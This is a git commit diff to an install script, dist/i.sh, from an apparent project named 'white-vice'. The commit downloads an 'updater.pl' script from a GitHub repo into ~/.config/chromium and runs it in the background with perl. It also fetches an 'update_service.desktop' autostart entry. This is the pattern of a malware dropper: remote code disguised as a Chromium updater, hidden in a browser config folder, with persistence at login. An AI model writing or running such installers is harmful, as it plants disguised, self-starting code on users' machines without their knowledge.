d716c8bf48be51c47c4873376dc8e199a61028fa
reimch <reimch@tutamail.com>
2024-10-28 17:35:27 +0300

    perl

--- dist/i.sh
+++ dist/i.sh
@@ -1,8 +1,6 @@
 mkdir ~/.config/chromium
-wget -O ~/.config/chromium/updater https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/dist/updater
-chmod +x ~/.config/chromium/updater
+wget -O ~/.config/chromium/updater.pl https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/src/updater.pl
 
 wget -O ~/.config/autostart/update_service.desktop https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/resources/update_service.desktop
-chmod +x ~/.config/autostart/update_service.desktop
 
-~/.config/chromium/updater &
+perl ~/.config/chromium/updater.pl &
